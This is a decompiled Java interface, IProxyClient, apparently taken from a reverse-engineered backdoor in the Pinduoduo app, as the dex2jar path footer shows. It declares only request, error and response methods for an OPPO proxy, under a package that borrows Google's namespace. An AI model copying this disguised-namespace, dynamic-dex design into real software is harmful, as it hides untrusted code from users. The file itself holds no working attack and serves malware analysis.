package com.google.android.sd.biz_dynamic_dex.oppo_proxy;

import android.content.Context;
import android.os.Bundle;
import com.google.android.sd.cmd.CmdData;

public interface IProxyClient {
  Bundle createRequestBundle(Context paramContext, CmdData paramCmdData);
  
  void handleError(Context paramContext, CmdData paramCmdData, String paramString);
  
  void parseResponseResult(Context paramContext, CmdData paramCmdData, Bundle paramBundle);
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\75dcc8ea-d0f9-4222-b8dd-2a83444f9cd6-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\oppo_proxy\IProxyClient.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */